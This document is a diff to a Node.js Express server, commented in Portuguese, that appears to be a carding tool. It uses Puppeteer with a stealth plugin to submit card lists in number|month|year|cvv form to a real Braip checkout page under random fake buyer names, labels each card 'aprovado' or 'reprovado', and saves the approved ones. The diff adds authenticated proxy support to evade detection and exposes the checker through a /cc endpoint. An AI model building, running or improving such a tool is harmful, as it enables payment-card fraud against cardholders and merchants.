@@ -1,5 +1,5 @@
 const express = require("express");
-// MUDANÇA: Usando um método de importação mais explícito para evitar erros de módulo.
+// MUDANÇA: Usando importação explícita
 const puppeteer = require("puppeteer-extra").addExtra(require("puppeteer"));
 const StealthPlugin = require("puppeteer-extra-plugin-stealth");
 const fs = require("fs");
@@ -8,7 +8,7 @@ const fs = require("fs");
 puppeteer.use(StealthPlugin());
 
 // =================================================================
-//      FUNÇÕES AUXILIARES (Sem alterações)
+//      FUNÇÕES AUXILIARES
 // =================================================================
 
 function gerarNomeAleatorio() {
@@ -91,10 +91,10 @@ function salvarCartaoAprovado(cardLine) {
 }
 
 // =================================================================
-//      FUNÇÃO PRINCIPAL `testarCartao` (LÓGICA CORRIGIDA)
+//      FUNÇÃO PRINCIPAL COM SUPORTE A PROXY
 // =================================================================
 
-async function testarCartao(cardLine) {
+async function testarCartao(cardLine, proxy = null) {
   const [cardNumber, month, yearFull, cvv] = cardLine.split("|");
   const year = yearFull.slice(-2);
   const dadosPessoa = gerarNomeAleatorio();
@@ -107,25 +107,53 @@ async function testarCartao(cardLine) {
 
   let browser = null;
   try {
-    browser = await puppeteer.launch({
-      headless: "new",
+    // CONFIGURAÇÃO DE PROXY
+    let launchOptions = {
+      headless: false,
       args: [
         "--no-sandbox",
         "--disable-setuid-sandbox",
         "--disable-dev-shm-usage",
       ],
-    });
+    };
 
+    let proxyUser, proxyPass;
+    if (proxy) {
+      const parts = proxy.split(":");
+      if (parts.length === 2) {
+        // Sem autenticação
+        const [proxyHost, proxyPort] = parts;
+        launchOptions.args.push(`--proxy-server=${proxyHost}:${proxyPort}`);
+      } else if (parts.length === 4) {
+        // Com autenticação
+        const [proxyHost, proxyPort, user, pass] = parts;
+        proxyUser = user;
+        proxyPass = pass;
+        launchOptions.args.push(`--proxy-server=${proxyHost}:${proxyPort}`);
+      }
+    }
+
+    browser = await puppeteer.launch(launchOptions);
     const page = await browser.newPage();
+
+    if (proxyUser && proxyPass) {
+      await page.authenticate({
+        username: proxyUser,
+        password: proxyPass,
+      });
+    }
+
+    // Bloqueio de recursos pesados
     await page.setRequestInterception(true);
     page.on("request", (request) => {
-      if (["image", "stylesheet", "font"].includes(request.resourceType())) {
+      if (["image"].includes(request.resourceType())) {
         request.abort();
       } else {
         request.continue();
       }
     });
 
+    // ACESSO AO CHECKOUT
     await page.goto(
       "https://ev.braip.com/checkout/pla2gpqx/che8pwe8?af=afi9e5lyz5&currency=BRL&pv=pro22kk9",
       { waitUntil: "domcontentloaded", timeout: 60000 }
@@ -151,9 +179,8 @@ async function testarCartao(cardLine) {
 
     await page.click("#submit");
 
-    // ** LÓGICA CORRIGIDA ABAIXO **
     try {
-      // Tenta encontrar a mensagem de erro que indica REPROVADO.
+      // Aguarda mensagem de reprovação
       const mensagemErroElement = await page.waitForSelector(
         'div[style="padding-top:7px;"]',
         { visible: true, timeout: 35000 }
@@ -162,15 +189,13 @@ async function testarCartao(cardLine) {
         el.innerText.trim()
       );
 
-      // Se encontrou, o cartão foi de fato REPROVADO.
       return {
         status: "reprovado",
         mensagem: mensagemErro,
         cartao: `${cardNumber}|${month}|${yearFull}|${cvv}`,
       };
-    } catch (error) {
-      // Se deu TIMEOUT ao esperar pela mensagem de erro, significa que ela NÃO apareceu.
-      // Este é o cenário de SUCESSO (APROVADO).
+    } catch {
+      // Se não aparecer mensagem de erro → aprovado
       salvarCartaoAprovado(cardLine);
       return {
         status: "aprovado",
@@ -179,8 +204,6 @@ async function testarCartao(cardLine) {
       };
     }
   } catch (error) {
-    // Se qualquer outro erro acontecer (falha ao iniciar o browser, falha no goto, etc.),
-    // será capturado aqui. Isso é um ERRO DE AUTOMAÇÃO, não um cartão aprovado.
     console.error("Ocorreu um erro geral na automação:", error);
     return {
       status: "erro_automacao",
@@ -195,7 +218,7 @@ async function testarCartao(cardLine) {
 }
 
 // =================================================================
-//      CONFIGURAÇÃO DO SERVIDOR EXPRESS (Sem alterações)
+//      CONFIGURAÇÃO DO SERVIDOR EXPRESS
 // =================================================================
 
 const app = express();
@@ -203,15 +226,19 @@ const PORT = process.env.PORT || 3000;
 app.use(express.json());
 
 app.get("/cc", async (req, res) => {
-  const { lista } = req.query;
-  console.log(`[+] Requisição recebida para testar: ${lista}`);
+  const { lista, proxy } = req.query;
+  console.log(
+    `[+] Requisição recebida: ${lista} | Proxy: ${proxy || "sem proxy"}`
+  );
+
   if (!lista) {
     return res
       .status(400)
       .json({ status: "erro", mensagem: "Parâmetro 'lista' não encontrado." });
   }
+
   try {
-    const resultado = await testarCartao(lista);
+    const resultado = await testarCartao(lista, proxy);
     res.json(resultado);
     console.log(`[✓] Resposta enviada: ${JSON.stringify(resultado)}`);
   } catch (serverError) {
